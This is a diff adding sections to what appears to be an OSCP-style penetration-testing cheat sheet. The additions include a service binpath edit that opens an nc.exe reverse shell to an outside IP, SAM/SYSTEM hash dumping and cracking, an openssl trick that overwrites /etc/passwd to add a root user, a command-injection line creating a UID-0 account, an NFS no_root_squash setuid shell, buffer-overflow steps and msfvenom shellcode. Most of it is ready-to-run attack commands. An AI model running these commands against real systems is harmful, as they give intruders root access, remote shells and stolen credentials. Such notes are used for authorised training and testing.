@@ -282,3 +282,241 @@ PS C:\> Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadStri
 -----------------------------------------------------------------------------------------------------
 Invoke-Command -ComputerName localhost -Creadential $credential -ScriptBlock { C:\inetpub\wwwroot\internal-01\log\nc.exe 10.10.14.4 1338 -e cmd.exe }
 ~~~
+###### Incorrect permisions in services (sc config binpath)
+Binpath is set as running cmd.exe passing a commad to execute to it (so once the process dies, the one executed by it so the command to cmd.exe remains):
+~~~
+sc config upnphost binpath= "C:\WINDOWS\System32\cmd.exe /k C:\inetpub\wwwroot\nc.exe -nv 192.168.42.42 443 -e C:\WINDOWS\System32\cmd.exe" 
+~~~
+###### SAM + SYSTEM + Security
+If those 3 files are in your hands (you could download to your attacker machine), you can dump hashes and crack them:
+~~~
+/usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM.bak -security SECURITY.bak -system SYSTEM.bak LOCAL
+sudo john dumped_hashes --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
+~~~
+##### Linux
+###### /home/user/openssl =ep (empty capabilities)
+Make 2 copies of passwd, one as backup of the original, and one that will be used as custom:
+~~~
+cp /etc/passwd /tmp/passwd.orig
+cp /etc/passwd /tmp/passwd.custom
+~~~
+Now, a custom user will be created and added to /tmp/passwd.custom with customPassword and as root user (UID = GID = 0):
+~~~
+echo 'ceso:'"$( openssl passwd -6 -salt xyz customPassword )"':0:0::/tmp:/bin/bash' >> /tmp/passwd.custom
+~~~
+Now, create a custom key.pem and cert.pem with openssl:
+~~~
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
+~~~
+Encrypt the new custom passwd:
+~~~
+openssl smime -encrypt -aes256 -in /tmp/passwd.custom -binary -outform DER -out /tmp/passwd.enc /tmp/cert.pem
+~~~
+Now, decrypt the custom passwd overwritting in the process the real one (/etc/passwd):
+~~~
+cd /
+/home/ldapuser1/openssl smime -decrypt -in /tmp/passwd.enc -inform DER -inkey /tmp/key.pem -out /etc/passwd
+~~~
+And finally, just login with the user created with root privileges by using customPassword:
+~~~
+su - ceso
+~~~
+###### Command web injection: add user
+~~~
+/usr/sbin/useradd c350 -u 4242 -g root -m -d /home/c350 -s /bin/bash -p $(echo pelota123 | /usr/bin/openssl passwd -1 -stdin) ; sed 's/:4242:0:/:0:0:/' /etc/passwd -i 
+~~~
+NFS; no_root_squash,insecure,rw
+If /etc/exports has a line like:
+~~~
+/srv/pelota 192.168.42.0/24(insecure,rw)
+/srv/pelota 127.0.0.1/32(no_root_squash,insecure,rw)
+~~~
+NFS is being exported and you and you have ssh access to the machine. From your attacker machine while logged as root user run:
+~~~
+ssh -f -N megumin@192.168.42.43 -L 2049:127.0.0.1:2049
+mount -t nfs 127.0.0.1:/srv/pelota my_share
+cd my_share
+cat > shell.c<<EOF
+#include <unistd.h>
+int main(){
+  setuid(0);
+  setgid(0);
+  system("/bin/bash");
+}
+EOF
+gcc shell.c -o shell
+chmod u+s shell
+~~~
+Now from inside a SSH session on the victim machine (in this example 192.168.42.32):
+~~~
+bash-4.2$ cd /srv/pelota
+bash-4.2$ ./shell
+bash-4.2# id
+uid=0(root) gid=0(root) groups=0(root),1000(megumin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+~~~
+###### Good to know (either Windows and/or Linux)
+###### Arch cross compile exploit (and diff glibc version)
+~~~
+gcc -m32 -Wall -Wl,--hash-style=both -o gimme.o gimme.c
+~~~
+IP restriction at application level, bypass
+Try to send a request modifying the HTTP header by adding:
+~~~
+X-Forwarder-For: <ip allowed>
+~~~
+Windows - check OS information
+~~~
+systeminfo
+ver
+~~~
+Windows - check architecture
+~~~
+wmic os get osarchitecture
+echo %PROCESSOR_ARCHITECTURE%
+~~~
+Powershell running as 32 or 64 bits
+~~~
+[Environment]::Is64BitProcess
+~~~
+Linux LFI - intesresting files to look after
+~~~
+/proc/self/status
+/proc/self/environ
+/etc/passwd
+/etc/hosts
+/etc/exports
+~~~
+##### Simple Buffer Overflow (32 bits, NO ASLR and NO DEP)
+###### Summarized steps
+0 - Crash the application
+1 - Fuzzing (find aprox number of bytes where the crash took place)
+2 - Find offset
+3 - EIP control
+4 - Check for enough space on buffer
+5 - Badchars counting
+6 - Find return address (JMP ESP)
+7 - Create payload
+
+Fuzzing: example with vulnserver + spike on TRUN command
+~~~
+cat > trun.spk <<EOF
+s_readline();
+s_string("TRUN ");
+s_string_variable("COMMAND");
+EOF
+~~~
+Now, start wireshark filtering on the target IP/PORT below and run the trun.spk:
+~~~
+generic_send_tcp 172.16.42.131 9999 trun.spk 0 0
+~~~
+Once a crash takes place, go to wireshark to locate the crash.
+
+##### Badchars
+From the block below, the next ones were not included (most common badchars):
+~~~
+\x00 --> null byte
+\x0a --> new line character (AKA "\n")
+~~~
+
+So…actual list of badchars:
+
+\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
+
+###### Usefull tools (on Kali Linux)
+###### create_pattern
+~~~
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
+/usr/bin/msf-pattern_create
+~~~
+###### pattern_offset
+~~~
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
+/usr/bin/msf-pattern_offset
+~~~
+###### nasm_shell
+~~~
+/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+/usr/bin/msf-nasm_shell
+~~~
+###### msfvenom
+~~~
+/usr/share/metasploit-framework/msfvenom
+/usr/bin/msfvenom
+~~~
+###### Shellcode POC: calc.exe
+~~~
+msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name buffer CMD=calc.exe EXITFUNC=thread
+~~~
+
+##### Usefull links
+###### Privilege escalation
+Linux
+https://gtfobins.github.io/
+https://book.hacktricks.xyz/linux-unix/privilege-escalation
+https://guif.re/linuxeop
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+https://www.win.tue.nl/~aeb/linux/hh/hh-8.html
+http://www.dankalia.com/tutor/01005/0100501004.htm
+
+Windows
+https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
+http://www.fuzzysecurity.com/tutorials/16.html
+https://github.com/J3rryBl4nks/LPEWalkthrough/blob/master/Walkthrough.md
+https://github.com/worawit/MS17-010 <—— Eternal blue without MSF
+https://github.com/ankh2054/windows-pentest
+https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
+https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html
+https://github.com/frizb/Windows-Privilege-Escalation
+
+###### Misc
+Windows
+http://www.cheat-sheets.org/saved-copy/Windows_folders_quickref.pdf
+https://www.lemoda.net/windows/windows2unix/windows2unix.html
+https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html
+https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/
+https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html
+https://malicious.link/post/2016/kerberoast-pt1/
+Linux
+http://www.pathname.com/fhs/pub/fhs-2.3.html
+https://github.com/rapid7/ssh-badkeys
+http://www.linusakesson.net/programming/tty/
+http://pentestmonkey.net/blog/post-exploitation-without-a-tty
+
+###### Pivoting
+https://artkond.com/2017/03/23/pivoting-guide/
+https://nullsweep.com/pivot-cheatsheet-for-pentesters/
+https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html
+###### Brute force/Cracking
+https://github.com/Coalfire-Research/npk <—— Distributed hash-cracking platform on serverless AWS componentes
+https://hashcat.net/wiki/doku.php?id=example_hashes
+https://github.com/danielmiessler/SecLists
+https://github.com/rapid7/ssh-badkeys
+https://crackstation.net/
+###### Compiling exploits
+https://stackoverflow.com/questions/4032373/linking-against-an-old-version-of-libc-to-provide-greater-application-coverage
+https://www.lordaro.co.uk/posts/2018-08-26-compiling-glibc.html
+https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/
+###### Obfuscators
+https://github.com/danielbohannon/Invoke-Obfuscation
+https://github.com/Bashfuscator/Bashfuscator
+###### Deobfuscators
+https://www.unphp.net/
+https://lelinhtinh.github.io/de4js/
+http://jsnice.org/
+https://github.com/java-deobfuscator/deobfuscator
+###### Buffer Overflows
+https://github.com/justinsteven/dostackbufferoverflowgood
+https://github.com/stephenbradshaw/vulnserver
+https://www.vulnhub.com/entry/brainpan-1,51/
+https://exploit.education/phoenix/
+https://www.youtube.com/watch?v=1S0aBV-Waeo
+###### Another OSCP/Hacking Cheatsheets
+https://github.com/swisskyrepo/PayloadsAllTheThings/
+https://github.com/tagnullde/OSCP/blob/master/oscp-cheatsheet.md
+https://github.com/Optixal/OSCP-PWK-Notes-Public
+https://github.com/OlivierLaflamme/Cheatsheet-God
+https://github.com/0x4D31/awesome-oscp
+https://github.com/xapax/security
+https://book.hacktricks.xyz/
+https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html
+https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html
